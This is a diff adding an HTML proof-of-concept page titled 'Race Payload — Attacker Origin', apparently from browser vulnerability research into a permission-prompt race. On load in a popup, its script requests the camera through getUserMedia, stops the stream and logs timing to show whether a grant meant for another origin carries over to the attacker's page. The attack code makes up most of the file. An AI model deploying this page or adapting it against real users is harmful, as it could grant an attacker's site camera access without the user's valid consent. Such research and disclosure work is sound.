@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Race Payload</title>
+<style>
+body{font-family:monospace;background:#1a1a2e;color:#0f0;padding:20px}
+p{font-size:14px}
+</style>
+</head>
+<body>
+<h3>Race Payload — Attacker Origin</h3>
+<p>This page loaded in the popup after navigation.</p>
+<p>Immediately calling <code>getUserMedia()</code> on load...</p>
+<pre id="log"></pre>
+<script>
+const L = (m) => { document.getElementById('log').textContent += m + '\n'; };
+const t0 = performance.now();
+L('[Page loaded on: ' + location.origin + ']');
+
+navigator.mediaDevices.getUserMedia({video:true})
+  .then(s => {
+    s.getTracks().forEach(t => t.stop());
+    L('GRANTED in ' + (performance.now()-t0).toFixed(0) + 'ms');
+    L('⚠️ Camera accessible from attacker origin.');
+  })
+  .catch(e => {
+    const ms = (performance.now()-t0).toFixed(1);
+    L(e.name + ' in ' + ms + 'ms ' + (ms < 1 ? '← SYNCHRONOUS' : ''));
+    L('Sync response overwrites permission origin before bubble teardown task.');
+  });
+
+L('UA: ' + (navigator.userAgent.match(/Chrome\/\d+/)||['unknown'])[0]);
+</script>
+</body>
+</html>
